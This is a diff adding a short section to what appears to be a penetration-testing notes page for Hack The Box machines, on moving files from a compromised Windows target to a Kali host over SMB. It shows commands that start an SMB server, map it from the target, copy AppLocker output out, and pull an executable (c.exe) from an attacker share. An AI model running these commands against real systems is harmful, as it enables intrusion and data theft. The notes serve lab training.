@@ -274,3 +274,20 @@ C:\xampp\htdocs\gym\upload>copy \\10.10.14.9\share\c_w c.exe
 ```
 
   
+## Windows -> Linux transfer
+### SMB
+We wil frist start a SMB server on our Kali machine:
+
+`impacket-smbserver share .`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-22.png)
+
+On the target machine, let's connect to the created SMB server:
+
+`net use * \\10.10.14.36\share`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-35.png)
+
+Through the command `copy output.xml Y:` on target machine, we can copy the Applocker output to our local Kali machine:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-36.png)
